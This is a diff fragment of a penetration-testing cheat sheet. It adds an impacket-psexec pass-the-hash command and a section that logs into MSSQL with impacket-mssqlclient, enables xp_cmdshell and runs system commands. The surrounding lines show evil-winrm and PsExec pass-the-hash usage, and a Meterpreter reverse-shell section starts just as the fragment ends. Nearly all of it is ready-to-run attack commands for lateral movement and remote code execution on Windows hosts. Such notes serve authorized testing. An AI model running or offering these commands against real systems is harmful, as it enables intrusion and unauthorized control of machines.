@@ -36,6 +36,24 @@ evil-winrm -i 192.168.1.1 -u 'username' -H '00000000000000000000000000000000'
 ./PsExec64.exe -i \\192.168.1.1 -u TEST\username -p "password" powershell
 ```
 
+``` bash
+impacket-psexec -hashes 00000000000000000000000000000000:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX $username@192.168.1.1
+```
+
+
+## MSSQL per reverse shell
+``` bash
+impacket-mssqlclient '$username':'$password'@192.168.1.1 -windows-auth
+```
+Manual Code Exec
+``` text
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+SQL> RECONFIGURE;
+SQL> EXECUTE xp_cmdshell 'whoami';
+```
+
 ## Meterpreter reverse shell (1)
 Payload for windows:
 ``` bash
